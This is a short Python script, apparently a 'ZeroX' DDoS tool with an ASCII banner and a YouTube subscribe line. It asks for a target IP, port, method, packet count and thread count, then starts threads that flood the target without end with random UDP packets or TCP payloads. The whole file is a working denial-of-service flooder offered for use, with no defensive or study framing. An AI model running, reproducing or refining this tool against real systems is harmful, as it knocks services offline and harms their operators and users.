import random
import socket
import threading
import time
import os,sys

os.system('clear')
print("\033[1;31;40m")
print("""

╭━━━━╮╱╱╱╱╱╱╱╭━╮╭━╮
╰━━╮━┃╱╱╱╱╱╱╱╰╮╰╯╭╯
╱╱╭╯╭╋━━┳━┳━━╮╰╮╭╯
╱╭╯╭╯┃┃━┫╭┫╭╮┃╭╯╰╮
╭╯━╰━┫┃━┫┃┃╰╯┣╯╭╮╰╮
╰━━━━┻━━┻╯╰━━┻━╯╰━╯""")
print("\033[1;36;40m--------METHODS UDP / TCP TOOLS------")
print("-----------TOOLS FOR MEMBER------------")
print("--------Subscribe Yt Saya Gada Lu Bau--------")
ip = str(input("\033[1;36;40mIP : \033[1;31;40m"))
port = int(input("\033[1;36;40mPORT : \033[1;31;40m"))
choice = str(input("\033[1;36;40mMETHODS : \033[1;31;40m"))
times = int(input("\033[1;36;40mPACKETS : \033[1;31;40m"))
threads = int(input("\033[1;36;40mTHREADS : \033[1;31;40m"))

os.system("clear")
def run():

	data = random._urandom(1050)

	i = random.choice(("","",""))

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			addr = (str(ip),int(port))

			for x in range(times):

				s.sendto(data,addr)

			print("\033[1;36;40mZeroX Attack %s Port %s"%(ip,port))

		except:

			print("Down!!!")



def run2():

	data = random._urandom(102498)

	i = random.choice(("","",""))

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

			s.connect((ip,port))

			s.send(data)

			for x in range(times):

				s.send(data)

			print("\033[1;36;40mZeroX Attack %s Port %s"%(ip,port))

		except:

			s.close()

			print("Down!!")

for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = run)
        th.start()
    elif choice == 'TCP':
        th = threading.Thread(target = run2)
        th.start()
